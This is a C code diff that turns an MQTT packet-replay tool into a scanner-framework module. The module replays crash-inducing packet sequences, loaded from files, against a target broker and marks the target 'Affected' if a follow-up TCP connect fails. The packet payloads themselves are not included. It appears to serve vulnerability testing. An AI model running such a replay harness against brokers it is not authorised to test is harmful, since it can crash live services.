@@ -1,6 +1,10 @@
+#define KRAKEN_MODULE_BUILD
+#include <kraken_module_abi.h>
+
 #include <arpa/inet.h>
 #include <errno.h>
 #include <pthread.h>
+#include <stdbool.h>
 #include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -11,6 +15,75 @@
 #define MAX_PACKETS 256
 #define MAX_PACKET_SIZE 17000
 #define MAX_CONNECTIONS 32
+
+KRAKEN_API const uint32_t KRAKEN_MODULE_ABI_VERSION = KRAKEN_ABI_VERSION;
+
+/* ------------------------------------------------------------------ */
+/* Utility Functions for ABI Structs                                  */
+/* ------------------------------------------------------------------ */
+
+static char *mystrdup(const char *s) {
+    if (!s)
+        return NULL;
+    size_t len = strlen(s) + 1;
+    char *p = (char *)malloc(len);
+    if (p) {
+        memcpy(p, s, len);
+    }
+    return p;
+}
+
+static void add_log(KrakenRunResult *result, const char *log_line) {
+    result->logs.count++;
+    result->logs.strings = (const char **)realloc((void *)result->logs.strings, result->logs.count * sizeof(char *));
+    result->logs.strings[result->logs.count - 1] = mystrdup(log_line);
+}
+
+static char *json_extract_string(const char *json, const char *key) {
+    if (!json)
+        return NULL;
+
+    char search[256];
+    snprintf(search, sizeof(search), "\"%s\"", key);
+    const char *p = strstr(json, search);
+    if (!p)
+        return NULL;
+
+    p = strchr(p, ':');
+    if (!p)
+        return NULL;
+    p++;
+
+    // Skip whitespace and opening quote
+    while (*p && (*p == ' ' || *p == '\t' || *p == '\n'))
+        p++;
+    if (*p != '\"')
+        return NULL;
+    p++;
+
+    // Find closing quote
+    const char *end = p;
+    while (*end && *end != '\"')
+        end++;
+
+    size_t len = end - p;
+    char *result = (char *)malloc(len + 1);
+    if (result) {
+        memcpy(result, p, len);
+        result[len] = '\0';
+    }
+    return result;
+}
+
+static void add_finding(KrakenRunResult *result, KrakenFinding *finding) {
+    result->findings_count++;
+    result->findings = (KrakenFinding *)realloc(result->findings, result->findings_count * sizeof(KrakenFinding));
+    result->findings[result->findings_count - 1] = *finding;
+}
+
+/* ------------------------------------------------------------------ */
+/* Core Logic                                                         */
+/* ------------------------------------------------------------------ */
 
 typedef enum {
     INVALID = 0,
@@ -110,7 +183,7 @@ static MqttPacketType mqtt_packet_type_from_string(const char *str) {
     return INVALID;
 }
 
-// Decode %XX% format to bytes
+// Decode %x00 format to bytes
 uint8_t *decode_packet_data_from_hex_percent(const char *hex_str, size_t *out_len) {
     size_t len = strlen(hex_str);
 
@@ -136,7 +209,6 @@ uint8_t *decode_packet_data_from_hex_percent(const char *hex_str, size_t *out_le
     return buffer;
 }
 
-// Read file and fill packet_list
 static int read_file(const char *file_path, mqtt_packet packet_list[MAX_PACKETS], size_t *packet_count) {
     FILE *fp = fopen(file_path, "r");
     if (!fp) {
@@ -320,23 +392,147 @@ void replay_packets(const char *broker_ip, uint16_t broker_port, mqtt_packet pac
     }
 }
 
-int main(int argc, char **argv) {
-    if (argc < 2) {
-        fprintf(stderr, "[?] Usage: %s segfault_packets.txt\n", argv[0]);
-        return 1;
+int heartbeat(const char *broker_ip, uint16_t broker_port) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        exit(1);
     }
 
-    mqtt_packet packets[MAX_PACKETS];
-    size_t packet_count = 0;
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(broker_port);
+    inet_pton(AF_INET, broker_ip, &addr.sin_addr);
 
-    fprintf(stderr, "[+] Loading packets sequence\n");
-    if (read_file(argv[1], packets, &packet_count) != 0) {
-        fprintf(stderr, "[-] Failed to read packet file\n");
-        return 1;
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("connect");
+        return 1; // Affected
     }
-    fprintf(stderr, "[+] Finished loading packets sequence, #packets = %zu\n", packet_count);
+    return 0; // NOT Affected
+}
 
-    fprintf(stderr, "[+] Starting  reproducing packets sequence\n");
-    replay_packets("127.0.0.1", 1883, packets, packet_count);
+/* ------------------------------------------------------------------ */
+/* Entrypoint                                                         */
+/* ------------------------------------------------------------------ */
+
+// int main(int argc, char **argv) {
+//     if (argc < 2) {
+//         fprintf(stderr, "[?] Usage: %s segfault_packets.txt\n", argv[0]);
+//         return 1;
+//     }
+
+//     mqtt_packet packets[MAX_PACKETS];
+//     size_t packet_count = 0;
+
+//     fprintf(stderr, "[+] Loading packets sequence\n");
+//     if (read_file(argv[1], packets, &packet_count) != 0) {
+//         fprintf(stderr, "[-] Failed to read packet file\n");
+//         return 1;
+//     }
+//     fprintf(stderr, "[+] Finished loading packets sequence, #packets = %zu\n", packet_count);
+
+//     fprintf(stderr, "[+] Starting  reproducing packets sequence\n");
+//     replay_packets("127.0.0.1", 1883, packets, packet_count);
+//     return 0;
+// }
+
+KRAKEN_API int kraken_run(const char *host, uint32_t port, uint32_t timeout_ms, const char *params_json, KrakenRunResult **out_result) {
+    // 1. Allocate and initialize the main result structure
+    KrakenRunResult *result = (KrakenRunResult *)calloc(1, sizeof(KrakenRunResult));
+    if (!result)
+        return -1;
+
+    result->target.host = mystrdup(host);
+    result->target.port = (uint16_t)port;
+
+    // 2. Perform MQTT checks
+    char *sequence_num = json_extract_string(params_json, "sequence_num");
+    int seq_num = strtol(sequence_num, NULL, 10);
+
+    time_t ts = time(NULL);
+    for (int i = 0; i < seq_num; i++) {
+        bool is_successfull = false;
+
+        char buff[1000] = {};
+        int ok = sprintf(buff, "path%d", i);
+        char *path = json_extract_string(params_json, buff);
+
+        { // Replay main code
+            mqtt_packet packets[MAX_PACKETS];
+            size_t packet_count = 0;
+
+            if (read_file(path, packets, &packet_count) != 0) {
+                fprintf(stderr, "[-] Failed to read packet file\n");
+                return 1;
+            }
+            replay_packets(host, port, packets, packet_count);
+
+            if (heartbeat(host, port)) {
+                is_successfull = true;
+
+                // If it is not reachable we can close.
+                break;
+            }
+        }
+
+        KrakenFinding f = {0};
+        f.id = mystrdup("");
+        f.module_id = mystrdup("mqtt-replay");
+        f.success = is_successfull;
+        f.title = mystrdup("cve-xxx");
+        f.severity = mystrdup("high");
+        f.description = mystrdup("the broker is subject to cve-xxx");
+        f.timestamp = ts;
+        f.target.host = mystrdup(host);
+        f.target.port = port;
+
+        f.tags.count = 2;
+        f.tags.strings = (const char **)malloc(2 * sizeof(char *));
+        f.tags.strings[0] = mystrdup("mqtt");
+        f.tags.strings[1] = mystrdup("cve");
+
+        add_finding(result, &f);
+    }
+
+    *out_result = result;
     return 0;
+}
+
+KRAKEN_API void kraken_free(void *p) {
+    if (!p) {
+        return;
+    }
+
+    KrakenRunResult *result = (KrakenRunResult *)p;
+
+    free((void *)result->target.host);
+
+    for (size_t i = 0; i < result->findings_count; i++) {
+        KrakenFinding *f = &result->findings[i];
+        free((void *)f->id);
+        free((void *)f->module_id);
+        free((void *)f->title);
+        free((void *)f->severity);
+        free((void *)f->description);
+        free((void *)f->target.host);
+
+        for (size_t j = 0; j < f->evidence.count; j++) {
+            free((void *)f->evidence.items[j].key);
+            free((void *)f->evidence.items[j].value);
+        }
+        free(f->evidence.items);
+
+        for (size_t j = 0; j < f->tags.count; j++) {
+            free((void *)f->tags.strings[j]);
+        }
+        free((void *)f->tags.strings);
+    }
+    free(result->findings);
+
+    for (size_t i = 0; i < result->logs.count; i++) {
+        free((void *)result->logs.strings[i]);
+    }
+    free((void *)result->logs.strings);
+
+    free(result);
 }
